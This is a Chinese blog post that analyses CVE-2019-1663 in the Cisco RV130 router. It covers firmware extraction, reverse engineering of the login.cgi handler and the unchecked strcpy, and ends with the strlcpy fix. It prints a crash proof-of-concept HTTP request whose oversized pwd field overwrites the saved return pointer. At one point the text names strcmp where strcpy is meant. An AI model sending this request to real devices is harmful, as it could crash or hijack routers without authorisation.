---
title: cisco RV130简析
date: 2022-05-04 08:54:59
tags:
    - iot
---

<!--MORE-->

# Cisco RV130

## 固件下载

[下载地址](https://software.cisco.com/download/home/285026141/type/282465789/release/1.0.3.51?i=!pp)

## 解压固件

可以看到固件包是linux内核，ARM小端序架构，也包含squashfs文件

![image-20220504092611541](https://s2.loli.net/2022/05/04/b5B1HVU9Orl8ESP.png)

## 查找漏洞

网上POC说是在httpd文件在进行请求处理时有漏洞，可以通过grep命令查找到

![image-20220504094157800](https://s2.loli.net/2022/05/04/GvDnrHhKjcewMdy.png)

## 分析漏洞

大多数的用户输入来自于web接口，受影响的二进制文件是httpd webserver二进制文件。实际上该文件只是处理经过80或443端口的所有数据，它获取通过HTTP传输的用户输入，并转换为系统级的配置。

CVE-2019-1663漏洞背后的问题机制：

![image-20220504104208812](https://s2.loli.net/2022/05/04/se4CiZlzfQBdkpT.png)

如果太长的数据传递到login.cgi终端的pwd参数，就会出现缓冲区溢出。这一步是认证之前发生的，下面看一下正常登陆的过程：

到web接口的登陆请求会发送给login.cgi终端，格式如下：

```
POST /login.cgi HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://192.168.1.1/
Content-Type: application/x-www-form-urlencoded
Content-Length: 137
Connection: close
Upgrade-Insecure-Requests: 1
 
submit_button=login&submit_type=&gui_action=&wait_time=0&change_action=&enc=1&user=cisco&pwd=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&sel_lang=EN
```

这里向pwd发送32字节的值（AAAAAAA……），对登录界面的http处理请求在IDA中的是sub_2C614()，地址是0x0002C614

![image-20220504104819113](https://s2.loli.net/2022/05/04/SgrfP5OnkzeiALN.png)

函数将POST请求的参数进行解析，存储到.bss段

![image-20220504153950842](https://s2.loli.net/2022/05/04/tCa1OjPTguhQUN5.png)

然后，将pwd参数的值从.bss段中提取，调用strcpy将值存到动态分配的内存中

![image-20220504154105815](https://s2.loli.net/2022/05/04/Oi6M3qRyUdu5mA1.png)

在正常登陆情况下，每个值都会进行相同的检查。在strcpy将值复制到内存中后，strlen就会计算每个项目的长度，然后strcmp比较两个值。如果所有检查都通过的话，就可以成功登陆。

但是学过pwn的都知道，strcmp这个函数其实是很危险的

## 函数原型

```
#include <string.h>
char *strcpy(char * restrict s1, const char * restrict s2);
[…]
```

它只包含两个字符类型的参数，但该函数不传递长度，s2指向的字符串会复制到s1指向的数组中。而没有指定长度很容易让攻击者利用这一潜在漏洞发起攻击，可以覆写栈内保存的返回指针，然后重定向进程的执行流。

在发送下面的请求给RV130时发生的情况就和上面一样：

```
POST /login.cgi HTTP/1.1
Host: 192.168.22.158
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://192.168.22.158/
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 571
 
submit_button=login&submit_type=&gui_action=&default_login=1&wait_time=0&change_action=&enc=1&user=cisco&pwd=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAZZZZ&sel_lang=EN
```

栈中保存的返回指针被“ZZZZ”覆写了，因此执行流会被重定向到0x5A5A5A5A。

研究人员建议使用strlcpy函数，strlcpy是C语言标准库函数，是更加安全版本的[strcpy](https://link.zhihu.com/?target=https%3A//baike.baidu.com/item/strcpy/5494519)函数，在已知目的地址空间大小的情况下，把从src地址开始且含有'\0'结束符的字符串复制到以dest开始的[地址空间](https://link.zhihu.com/?target=https%3A//baike.baidu.com/item/%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4),并不会造成缓冲区溢出。
